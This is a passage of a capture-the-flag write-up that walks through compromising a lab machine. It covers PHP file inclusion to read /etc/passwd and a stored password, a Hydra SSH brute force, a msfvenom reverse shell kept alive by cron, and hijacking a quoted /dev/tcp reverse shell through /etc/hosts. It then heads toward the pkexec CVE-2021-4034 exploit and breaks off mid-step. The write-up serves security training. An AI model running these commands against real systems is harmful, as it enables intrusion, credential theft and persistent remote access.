lMMnhwYzNRNkwzVnpjaTl6WW1sdUwyNXZiRzluYVc0S2FYSmpPbmc2TXprNk16azZhWEpqWkRvdmRtRnlMM0oxYmk5cGNtTmtPaTkxYzNJdmMySnBiaTl1YjJ4dloybHVDbWR1WVhSek9uZzZOREU2TkRFNlIyNWhkSE1nUW5WbkxWSmxjRzl5ZEdsdVp5QlRlWE4wWlcwZ0tHRmtiV2x1S1RvdmRtRnlMMnhwWWk5bmJtRjBjem92ZFhOeUwzTmlhVzR2Ym05c2IyZHBiZ3B1YjJKdlpIazZlRG8yTlRVek5EbzJOVFV6TkRwdWIySnZaSGs2TDI1dmJtVjRhWE4wWlc1ME9pOTFjM0l2YzJKcGJpOXViMnh2WjJsdUNuTjVjM1JsYldRdGJtVjBkMjl5YXpwNE9qRXdNRG94TURJNmMzbHpkR1Z0WkNCT1pYUjNiM0pySUUxaGJtRm5aVzFsYm5Rc0xDdzZMM0oxYmk5emVYTjBaVzFrT2k5MWMzSXZjMkpwYmk5dWIyeHZaMmx1Q25ONWMzUmxiV1F0Y21WemIyeDJaVHA0T2pFd01Ub3hNRE02YzNsemRHVnRaQ0JTWlhOdmJIWmxjaXdzTERvdmNuVnVMM041YzNSbGJXUTZMM1Z6Y2k5elltbHVMMjV2Ykc5bmFXNEtjM2x6ZEdWdFpDMTBhVzFsYzNsdVl6cDRPakV3TWpveE1EUTZjM2x6ZEdWdFpDQlVhVzFsSUZONWJtTm9jbTl1YVhwaGRHbHZiaXdzTERvdmNuVnVMM041YzNSbGJXUTZMM1Z6Y2k5elltbHVMMjV2Ykc5bmFXNEtiV1Z6YzJGblpXSjFjenA0T2pFd016b3hNRFk2T2k5dWIyNWxlR2x6ZEdWdWREb3ZkWE55TDNOaWFXNHZibTlzYjJkcGJncHplWE5zYjJjNmVEb3hNRFE2TVRFd09qb3ZhRzl0WlM5emVYTnNiMmM2TDNWemNpOXpZbWx1TDI1dmJHOW5hVzRLWDJGd2REcDRPakV3TlRvMk5UVXpORG82TDI1dmJtVjRhWE4wWlc1ME9pOTFjM0l2YzJKcGJpOXViMnh2WjJsdUNuUnpjenA0T2pFd05qb3hNVEU2VkZCTklITnZablIzWVhKbElITjBZV05yTEN3c09pOTJZWEl2YkdsaUwzUndiVG92WW1sdUwyWmhiSE5sQ25WMWFXUmtPbmc2TVRBM09qRXhNam82TDNKMWJpOTFkV2xrWkRvdmRYTnlMM05pYVc0dmJtOXNiMmRwYmdwMFkzQmtkVzF3T25nNk1UQTRPakV4TXpvNkwyNXZibVY0YVhOMFpXNTBPaTkxYzNJdmMySnBiaTl1YjJ4dloybHVDbXhoYm1SelkyRndaVHA0T2pFd09Ub3hNVFU2T2k5MllYSXZiR2xpTDJ4aGJtUnpZMkZ3WlRvdmRYTnlMM05pYVc0dmJtOXNiMmRwYmdwd2IyeHNhVzVoZEdVNmVEb3hNVEE2TVRvNkwzWmhjaTlqWVdOb1pTOXdiMnhzYVc1aGRHVTZMMkpwYmk5bVlXeHpaUXAxYzJKdGRYZzZlRG94TVRFNk5EWTZkWE5pYlhWNElHUmhaVzF2Yml3c0xEb3ZkbUZ5TDJ4cFlpOTFjMkp0ZFhnNkwzVnpjaTl6WW1sdUwyNXZiRzluYVc0S2MzTm9aRHA0T2pFeE1qbzJOVFV6TkRvNkwzSjFiaTl6YzJoa09pOTFjM0l2YzJKcGJpOXViMnh2WjJsdUNuTjVjM1JsYldRdFkyOXlaV1IxYlhBNmVEbzVPVGs2T1RrNU9uTjVjM1JsYldRZ1EyOXlaU0JFZFcxd1pYSTZMem92ZFhOeUwzTmlhVzR2Ym05c2IyZHBiZ3BpYkhWbE9uZzZNVEF3TURveE1EQXdPbUpzZFdVNkwyaHZiV1V2WW14MVpUb3ZZbWx1TDJKaGMyZ0tiSGhrT25nNk9UazRPakV3TURvNkwzWmhjaTl6Ym1Gd0wyeDRaQzlqYjIxdGIyNHZiSGhrT2k5aWFXNHZabUZzYzJVS2NtVmtPbmc2TVRBd01Ub3hNREF4T2pvdmFHOXRaUzl5WldRNkwySnBiaTlpWVhOb0NnPT0>)
+
+
+
+
+
+```
+<strong>root</strong>:x:0:0:root:<strong>/root</strong>:<strong>/bin/bash</strong>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+<strong>www-data</strong>:x:33:33:www-data:<strong>/var/www</strong>:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+<strong>blue</strong>:x:1000:1000:blue:<strong>/home/blue</strong>:<strong>/bin/bash</strong>
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+<strong>red</strong>:x:1001:1001::<strong>/home/red</strong>:<strong>/bin/bash</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### /etc/hosts
+
+
+
+
+
+```
+/index.php?page=php://filter/convert.base64-encode/resource=<strong>/etc/hosts</strong>
+```
+
+
+
+
+
+```
+127.0.0.1 localhost
+<strong>127.0.1.1 red</strong>
+<strong>192.168.0.1 redrules.thm</strong>
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### /proc/version
+
+
+
+
+
+```
+/index.php?page=php://filter/convert.base64-encode/resource=<strong>/proc/version</strong>
+```
+
+
+
+
+
+```
+Linux version 5.4.0-124-generic (buildd@lcy02-amd64-089) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #140-Ubuntu SMP Thu Aug 4 02:23:37 UTC 2022
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### /home/blue/.bash_history
+
+
+
+
+
+```
+/index.php?page=php://filter/convert.base64-encode/resource=<strong>/home/blue/.bash_history</strong>
+```
+
+
+
+
+
+```
+echo "Red rules"
+<strong>cd</strong>
+<strong>hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt</strong>
+cat passlist.txt
+rm passlist.txt
+sudo apt-get remove hashcat -y
+```
+
+
+
+
+
+
+
+[Get My GitHub Script for Automation](https://github.com/trustinveritas/pentest-project-site/blob/main/LFI/make-requests-to-website.py)
+
+
+
+
+
+
+
+---
+
+
+
+
+
+#### Let's make **_passlist.txt_**
+
+
+
+
+
+##### Understand What Blue Made here
+
+
+
+
+
+```
+<strong>hashcat --stdout .reminder</strong>
+> <strong><em>.reminder</em></strong> tells hashcat the input file
+> <strong><em>--stdout</em></strong> flag tells hashcat to print the output directly to the console or a file
+> <strong><em>passlist.txt</em></strong> this is the file where the output of the hashcat command will be stored.
+```
+
+
+
+
+
+```
+> Since we know, that...
+<strong><em>cd</em></strong>
+
+> Brings us to the directory <strong><em>/home/blue</em></strong>
+> <strong><em>.reminder</em></strong> must be in the home folder of blue
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### .reminder
+
+
+
+
+
+```
+/index.php?page=php://filter/convert.base64-encode/resource=<strong>/home/blue/.reminder</strong>
+```
+
+
+
+
+
+```
+c3VwM3JfcEBzJHcwcmQhCg==
+
+or
+
+sup3r_p@s$w0rd!
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### HASHCAT
+
+
+
+
+
+```
+echo 'sup3r_p@s$w0rd!' > .reminder
+```
+
+
+
+
+
+```
+<strong>hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt</strong>
+```
+
+
+
+
+
+```
+cat passlist.txt | wc -l
+```
+
+
+
+
+
+```
+77
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### EXPLOITATION
+
+
+
+
+
+##### HYDRA - SSH BRUTE FORCE
+
+
+
+
+
+```
+<strong>hydra -l blue -P passlist.txt -t 16 -v -f -e nsr -o credentials-ssh.txt ssh://10.10.212.150</strong>
+```
+
+
+
+
+
+```
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-03 18:54:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 80 login tries (l:1/p:80), ~5 tries per task
+[DATA] attacking ssh://10.10.212.150:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://blue@10.10.212.150:22
+[INFO] Successful, password authentication is supported by ssh://10.10.212.150:22
+[22][ssh] host: 10.10.212.150   login: blue   password: <strong>redacted</strong>
+[STATUS] attack finished for 10.10.212.150 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-03 18:54:43
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### Let's Login to SSH
+
+
+
+
+
+```
+<strong>ssh blue@10.10.212.150</strong>
+```
+
+
+
+
+
+##### FLAG1
+
+
+
+
+
+```
+<strong>cat /home/blue/flag1</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### DISCOVERY
+
+
+
+
+
+##### linPEAS
+
+
+
+
+
+```
+> Let's search for a Privilege Escalation PE !
+> First we need to download linPEAS on the target
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### Simple Python HTTP Server
+
+
+
+
+
+```
+<strong>sudo python3 -m http.server 80</strong>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+
+
+##### On the target machine
+
+
+
+
+
+```
+<strong>wget http://YOUR-IP/linpeas.sh</strong>
+<strong>chmod +x linpeas.sh</strong>
+<strong>./linpeas.sh</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### WAIT WHAT ?!?!?
+
+
+
+
+
+```
+No you are repeating yourself, you are repeating yourself
+You will never win Blue. <strong>I will change your password</strong>
+Say Bye Bye to your Shell Blue and that password
+Connection to 10.10.212.150 closed by remote host.
+Connection to 10.10.212.150 closed.
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### PERSISTENCE
+
+
+
+
+
+##### Reverse-SSH-Connection / SSH TUNNELING
+
+
+
+
+
+```
+> Crack SSH password again
+> Login
+> Create a SSH tunnel on port 2222
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### CRACK SSH PASSWORD AGAIN
+
+
+
+
+
+```
+<strong>hydra -l blue -P passlist.txt -t 16 -v -f -e nsr -o credentials-ssh.txt ssh://10.10.212.150</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### LOGIN
+
+
+
+
+
+```
+<strong>ssh blue@10.10.212.150</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### Create a SSH TUNNEL ON PORT 2222
+
+
+
+
+
+```
+ssh -f -N -T -R 2222:localhost:22 <strong>YOUR-USERNAME-OF-THEMACHINE</strong>@<strong>YOUR-TRYHACKME-IP</strong>
+
+load pubkey "/home/blue/.ssh/id_rsa": Permission denied
+load pubkey "/home/blue/.ssh/id_rsa": Permission denied
+load pubkey "/home/blue/.ssh/id_dsa": Permission denied
+load pubkey "/home/blue/.ssh/id_dsa": Permission denied
+load pubkey "/home/blue/.ssh/id_ecdsa": Permission denied
+load pubkey "/home/blue/.ssh/id_ecdsa": Permission denied
+load pubkey "/home/blue/.ssh/id_ecdsa_sk": Permission denied
+load pubkey "/home/blue/.ssh/id_ecdsa_sk": Permission denied
+load pubkey "/home/blue/.ssh/id_ed25519": Permission denied
+load pubkey "/home/blue/.ssh/id_ed25519": Permission denied
+load pubkey "/home/blue/.ssh/id_ed25519_sk": Permission denied
+load pubkey "/home/blue/.ssh/id_ed25519_sk": Permission denied
+load pubkey "/home/blue/.ssh/id_xmss": Permission denied
+load pubkey "/home/blue/.ssh/id_xmss": Permission denied
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### NOW LOGIN TO THE TUNNEL
+
+
+
+
+
+```
+<strong>ssh blue@localhost -p 2222</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### A NOTE FROM RED
+
+
+
+
+
+```
+I bet you are going to use linpeas and pspy, noob
+
+I really didn't think you would make it this far
+Fine fine, just run sudo -l and then enter this password <strong>WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==</strong>
+
+Here, I'll give you a hint, type exit and you'll be granted a root shell
+
+Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run Pspy? Yawn
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### New Try - With METASPLOIT
+
+
+
+
+
+##### CREATE REVERSE SHELL / Meterpreter Staged
+
+
+
+
+
+```
+<strong>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR-IP LPORT=4444 -f elf -o reverse.elf</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+> Login via SSH / Bruteforce the password with Hydra
+> Copy the reverse.elf like linPEAS
+>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### CREATE LISTENER
+
+
+
+
+
+```
+<strong>msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost YOUR-IP; set lport 4444; exploit"</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### CREATE PERSISTENCE / CRONJOB
+
+
+
+
+
+```
+> In the ssh connection make a cronjob
+
+<strong>(crontab -l 2>/dev/null; echo "* * * * * /tmp/reverse.elf") | crontab -</strong>
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+![](./img/wp-content-uploads-2023-08-boom.gif)
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
+
+
+
+
+#### DISCOVERY
+
+
+
+
+
+##### METERPRETER
+
+
+
+
+
+```
+<strong>getpid</strong>
+76004
+
+<strong>sysinfo</strong>
+Computer     : 10.10.212.150
+OS           : Ubuntu 20.04 (Linux 5.4.0-124-generic)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+
+<strong>getuid</strong>
+Server username: blue
+```
+
+
+
+
+
+```
+<strong>ps</strong>
+Process List
+============
+
+ PID    PPID   Name                                   Arch    User              Path
+ ---    ----   ----                                   ----    ----              ----
+ 1      0      systemd                                x86_64  root
+ 3      2      [rcu_gp]                               x86_64  root
+ 4      2      [rcu_par_gp]                           x86_64  root
+ 6      2      [kworker/0:0H-kblockd]                 x86_64  root
+ 9      2      [mm_percpu_wq]                         x86_64  root
+ 10     2      [ksoftirqd/0]                          x86_64  root
+ 11     2      [rcu_sched]                            x86_64  root
+ 12     2      [migration/0]                          x86_64  root
+ 13     2      [idle_inject/0]                        x86_64  root
+ 14     2      [cpuhp/0]                              x86_64  root
+ 15     2      [cpuhp/1]                              x86_64  root
+ 16     2      [idle_inject/1]                        x86_64  root
+ 17     2      [migration/1]                          x86_64  root
+ 18     2      [ksoftirqd/1]                          x86_64  root
+ 20     2      [kworker/1:0H-kblockd]                 x86_64  root
+ 21     2      [kdevtmpfs]                            x86_64  root
+ 22     2      [netns]                                x86_64  root
+ 23     2      [rcu_tasks_kthre]                      x86_64  root
+ 24     2      [kauditd]                              x86_64  root
+ 25     2      [khungtaskd]                           x86_64  root
+ 26     2      [oom_reaper]                           x86_64  root
+ 27     2      [writeback]                            x86_64  root
+ 28     2      [kcompactd0]                           x86_64  root
+ 29     2      [ksmd]                                 x86_64  root
+ 30     2      [khugepaged]                           x86_64  root
+ 77     2      [kintegrityd]                          x86_64  root
+ 78     2      [kblockd]                              x86_64  root
+ 79     2      [blkcg_punt_bio]                       x86_64  root
+ 80     2      [tpm_dev_wq]                           x86_64  root
+ 81     2      [ata_sff]                              x86_64  root
+ 82     2      [md]                                   x86_64  root
+ 83     2      [edac-poller]                          x86_64  root
+ 84     2      [devfreq_wq]                           x86_64  root
+ 85     2      [watchdogd]                            x86_64  root
+ 88     2      [kswapd0]                              x86_64  root
+ 89     2      [ecryptfs-kthrea]                      x86_64  root
+ 91     2      [kthrotld]                             x86_64  root
+ 92     2      [acpi_thermal_pm]                      x86_64  root
+ 93     2      [vfio-irqfd-clea]                      x86_64  root
+ 94     2      [ipv6_addrconf]                        x86_64  root
+ 104    2      [kstrp]                                x86_64  root
+ 107    2      [kworker/u5:0]                         x86_64  root
+ 120    2      [charger_manager]                      x86_64  root
+ 159    2      [nvme-wq]                              x86_64  root
+ 160    2      [ena]                                  x86_64  root
+ 161    2      [nvme-reset-wq]                        x86_64  root
+ 162    2      [nvme-delete-wq]                       x86_64  root
+ 183    2      [cryptd]                               x86_64  root
+ 209    2      [kdmflush]                             x86_64  root
+ 240    2      [raid5wq]                              x86_64  root
+ 282    2      [kworker/1:1H-kblockd]                 x86_64  root
+ 289    2      [jbd2/dm-0-8]                          x86_64  root
+ 290    2      [ext4-rsv-conver]                      x86_64  root
+ 326    2      [kworker/0:1H-kblockd]                 x86_64  root
+ 365    1      systemd-journald                       x86_64  root
+ 403    1      systemd-udevd                          x86_64  root
+ 519    2      [kaluad]                               x86_64  root
+ 520    2      [kmpath_rdacd]                         x86_64  root
+ 521    2      [kmpathd]                              x86_64  root
+ 522    2      [kmpath_handlerd]                      x86_64  root
+ 523    1      multipathd                             x86_64  root
+ 532    2      [loop0]                                x86_64  root
+ 534    2      [loop1]                                x86_64  root
+ 537    2      [loop2]                                x86_64  root
+ 540    2      [loop3]                                x86_64  root
+ 546    2      [jbd2/nvme0n1p2-]                      x86_64  root
+ 547    2      [ext4-rsv-conver]                      x86_64  root
+ 559    1      systemd-timesyncd                      x86_64  systemd-timesync
+ 597    1      systemd-networkd                       x86_64  systemd-network
+ 602    1      systemd-resolved                       x86_64  systemd-resolve
+ 615    1      accounts-daemon                        x86_64  root
+ 616    1      amazon-ssm-agent                       x86_64  root
+ 621    1      cron                                   x86_64  root
+ 622    1      dbus-daemon                            x86_64  messagebus
+ 632    1      irqbalance                             x86_64  root
+ 633    1      python3                                x86_64  root
+ 639    1      rsyslogd                               x86_64  syslog
+ 646    1      snapd                                  x86_64  root
+ 653    1      systemd-logind                         x86_64  root
+ 661    1      udisksd                                x86_64  root
+ 669    1      atd                                    x86_64  root
+ 691    1      agetty                                 x86_64  root
+ 706    1      agetty                                 x86_64  root
+ 707    1      python3                                x86_64  root
+ 718    1      sshd                                   x86_64  root
+ 719    1      polkitd                                x86_64  root
+ 758    1      apache2                                x86_64  root
+ 16926  2      [xfsalloc]                             x86_64  root
+ 16927  2      [xfs_mru_cache]                        x86_64  root
+ 16933  2      [jfsIO]                                x86_64  root
+ 16934  2      [jfsCommit]                            x86_64  root
+ 16935  2      [jfsCommit]                            x86_64  root
+ 16936  2      [jfsSync]                              x86_64  root
+ 71185  758    apache2                                x86_64  www-data
+ 71188  758    apache2                                x86_64  www-data
+ 71304  758    apache2                                x86_64  www-data
+ 71305  758    apache2                                x86_64  www-data
+ 71363  758    apache2                                x86_64  www-data
+ 71366  758    apache2                                x86_64  www-data
+ 71524  758    apache2                                x86_64  www-data
+ 71529  758    apache2                                x86_64  www-data
+ 71530  758    apache2                                x86_64  www-data
+ 71571  758    apache2                                x86_64  www-data
+ 74843  2      [kworker/0:2-events]                   x86_64  root
+ 74928  2      [kworker/1:1-events]                   x86_64  root
+ 75886  2      [kworker/0:0-events]                   x86_64  root
+ 75922  2      [kworker/u4:2-events_power_efficient]  x86_64  root
+ 75991  621    cron                                   x86_64  root
+<strong> 76001  75991  sh                                     x86_64  blue              /usr/bin/dash</strong>
+<strong> </strong><em><strong>76004  76001  reverse.elf                            x86_64  blue </strong>             <strong>/tmp/reverse.elf</strong></em>
+ 76045  2      [kworker/1:2-events]                   x86_64  root
+ 76086  2      [kworker/u4:1-events_power_efficient]  x86_64  root
+<strong> 76224  1      bash                                   x86_64  red
+ 76265  1      bash                                   x86_64  red</strong>
+ 76266  2      [kworker/u4:0-events_power_efficient]  x86_64  root
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### Let's Kill red process
+
+
+
+
+
+```
+<strong>kill 76224 76265</strong>
+```
+
+
+
+
+
+```
+> We see it always spawns a new process
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### Let's spawn a shell
+
+
+
+
+
+```
+<strong>shell</strong>
+Process 76459 created.
+Channel 1 created.
+
+<strong>python3 -c "import pty;pty.spawn('/bin/bash')"</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### linPEAS
+
+
+
+
+
+```
+<strong>cd /tmp
+wget http://your-ip/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</strong>
+```
+
+
+
+
+
+##### TRACES FROM RED
+
+
+
+
+
+```
+                ╔════════════════════════════════════════════════╗
+════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
+                ╚════════════════════════════════════════════════╝
+╔══════════╣ Cleaned processes
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
+
+<strong>red</strong>        76938  0.0  0.1   6972  2620 ?        S    18:31   0:00 <strong>bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 </strong>&
+<strong>red</strong>        77309  0.0  0.1   6972  2512 ?        S    18:32   0:00 <strong>bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &</strong>
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+<strong>/home/red/flag2</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### What can we do?
+
+
+
+
+
+```
+> So we know red uses
+<strong>bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &</strong>
+
+> <strong>redrules.thm/9001</strong>
+> If we check /etc/hosts
+Sending payload: /etc/hosts
+Decoded response:
+127.0.0.1 localhost
+127.0.1.1 red
+<strong><em>192.168.0.1 redrules.thm</em></strong>
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### WHAT IF WE...
+
+
+
+
+
+```
+> Change redrules.thm to our ip-address and start a netcat listener
+```
+
+
+
+
+
+```
+> Meterpreter Shell
+<strong>cd /etc
+edit hosts</strong>
+<strong>i</strong> == <strong>I</strong>nsert
+<strong>Esc </strong>== <strong>Esc</strong>ape from inster
+<strong>:wq</strong> == <strong>W</strong>rite changes and <strong>Q</strong>uite
+
+meterpreter > cd /etc/
+meterpreter > edit hosts
+[-] core_channel_open: Operation failed: 1
+```
+
+
+
+
+
+```
+<strong>ls -la | grep hosts</strong>
+
+100646/rw-r--r<strong>w</strong>-  242  fil  2023-08-03 21:03:01 +0200  hosts
+
+> We have write rights but can't save.
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### HERE COMES THE TRICK
+
+
+
+
+
+```
+> Check for attributes set
+<strong>lsattr /etc/hosts</strong>
+
+
+> Normal output
+--------------e------- hosts
+
+> Append rights
+-----<strong>a</strong>--------e----- hosts
+```
+
+
+
+
+
+```
+<strong>echo YOUR-IP redrules.thm >> /etc/hosts</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### NETCAT Listener
+
+
+
+
+
+```
+<strong>sudo rlwrap nc -lvnp 9001</strong>
+```
+
+
+
+
+
+```
+> Now Let's Drop in to activte red !
+
+# Meterpreter Shell
+<strong>shell</strong>
+<strong>python3 -c "import pty;pty.spawn('/bin/bash')"</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### FLAG2
+
+
+
+
+
+```
+<strong>cat /home/red/flag2</strong>
+```
+
+
+
+
+
+##### CREATE PERSISTENCE
+
+
+
+
+
+```
+<strong>(crontab -l 2>/dev/null; echo "* * * * * /tmp/reverse.elf") | crontab -</strong>
+```
+
+
+
+
+
+##### START METASPLOIT LISTENER
+
+
+
+
+
+```
+msf6 exploit(multi/handler) > <strong>exploit</strong>
+
+meterpreter > <strong>getuid</strong>
+Server username: red
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### Make Stable Shell
+
+
+
+
+
+```
+<strong>python3 -c "import pty;pty.spawn('/bin/bash')"</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### List Cronjobs
+
+
+
+
+
+```
+<strong>crontab -l</strong>
+
+<em><strong>*/1 * * * * echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh</strong></em>
+* * * * * /tmp/reverse.elf
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### Edit Cronjobs
+
+
+
+
+
+```
+> We got you !
+<strong>cd /tmp
+crontab -l > temp_cron
+Ctrl + C
+y
+</strong>meterpreter > <strong>cd /tmp
+</strong>meterpreter > <strong>edit temp_cron</strong>
+<strong>i
+Esc
+:wq</strong>
+<strong>shell</strong>
+<strong>python3 -c "import pty;pty.spawn('/bin/bash')"</strong>
+<strong>crontab temp_cron</strong>
+<strong>crontab -l
+rm temp_cron</strong>
+```
+
+
+
+
+
+```
+> So now we removed red his cronjob and got flag2
+
+> Time to get root !
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### PRIVILEGE ESCALATION
+
+
+
+
+
+##### linPEAS
+
+
+
+
+
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root root 31K Aug 14  2022 <strong>/home/red/.git/pkexec</strong>  --->  Linux4.10_to_5.1.17(<strong>CVE-2019-13272</strong>)/rhel_6(<strong>CVE-2011-1485</strong>)
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### [GTFOBINS](https://gtfobins.github.io/gtfobins/pkexec/)
+
+
+
+
+
+```
+<strong>Sudo</strong>
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+<strong>sudo pkexec /bin/sh</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### .BASH_HISTORY
+
+
+
+
+
+```
+ls -la
+ls -la
+total 36
+drwxr-xr-x 4 root red  4096 Aug 17  2022 .
+drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
+lrwxrwxrwx 1 root root    9 Aug 14  2022 <strong>.bash_history -> /dev/null</strong>
+-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
+drwx------ 2 red  red  4096 Aug 14  2022 .cache
+drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
+-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
+-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
+-rw------- 1 red  red     0 Aug 17  2022 .viminfo
+-rw-r----- 1 root red    41 Aug 14  2022 flag2
+```
+
+
+
+
+
+```
+> Unfortunatly everything get's deleted with <strong>/dev/null</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### .git
+
+
+
+
+
+```
+<strong>cd .git</strong>
+<strong>./pkexec --version</strong>
+
+<a href="https://packetstormsecurity.com/files/165739/PolicyKit-1-0.105-31-Privilege-Escalation.html" target="_blank" rel="noreferrer noopener">pkexec version 0.105</a>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### CVE-2021-4034
+
+
+
+
+
+[GitHub to the Exploit](https://github.com/ryaagard/CVE-2021-4034)
+
+
+
+
+
+```
+> On the target
+<strong>ldd --version</strong>
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.7) 2.31
+
+> Use the TryHackMe AttackBox
+  - (Because of GLIBC Version issues)
+<strong>git clone https://github.com/ryaagard/CVE-2021-4034.git</strong>
+
+<strong>cd</strong> <strong>CVE-2021-4034</strong>
+<strong>subl exploit.c</strong>
+
+> Edit this line to
+<strong>#define BIN "/home/red/.git/pkexec"</strong>
+
+> Make the exploit
